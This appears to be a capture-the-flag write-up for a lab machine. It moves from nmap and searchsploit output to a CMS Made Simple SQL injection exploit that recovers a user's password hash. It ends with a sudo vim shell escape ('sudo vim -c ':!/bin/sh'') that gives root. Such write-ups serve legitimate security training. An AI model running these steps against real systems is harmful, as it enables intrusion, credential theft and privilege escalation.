**Tristan Gomez**

```
└─$ sudo nmap -sV 10.10.35.175
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 14:27 PDT
Nmap scan report for 10.10.35.175
Host is up (0.19s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

gobuster found /simple. Navigating there I find a CMS page with the version number and a link to a login page.

```
└─$ searchsploit cms 2.2.8
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Bolt CMS < 3.6.2 - Cross-Site Scripting                                          | php/webapps/46014.txt
CMS Made Simple < 2.2.10 - SQL Injection                                         | php/webapps/46635.py
Concrete CMS < 5.5.21 - Multiple Vulnerabilities                                 | php/webapps/37225.pl
Concrete5 CMS < 5.4.2.1 - Multiple Vulnerabilities                               | php/webapps/17925.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration                          | php/webapps/44194.py
DeDeCMS < 5.7-sp1 - Remote File Inclusion                                        | php/webapps/37423.txt
Kirby CMS < 2.5.7 - Cross-Site Scripting                                         | php/webapps/43140.txt
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                   | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                   | php/webapps/44646.txt
Mura CMS < 6.2 - Server-Side Request Forgery / XML External Entity Injection     | cfm/webapps/43045.txt
Redaxo CMS Mediapool Addon < 5.5.1 - Arbitrary File Upload                       | php/webapps/44891.txt
zKup CMS 2.0 < 2.3 - Arbitrary File Upload                                       | php/webapps/5220.php
zKup CMS 2.0 < 2.3 - Remote Add Admin                                            | php/webapps/5219.php
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

`CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py`

exploit script results

```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[*] Try: secret

```


`mitch:secret`

```
$ cat user.txt
G00d j0b, keep up!
```

`cd ..`
`sunbath`

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

gtfobins
```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo vim -c ':!/bin/sh'
```

```
# cat root.txt
W3ll d0n3. You made it!

```
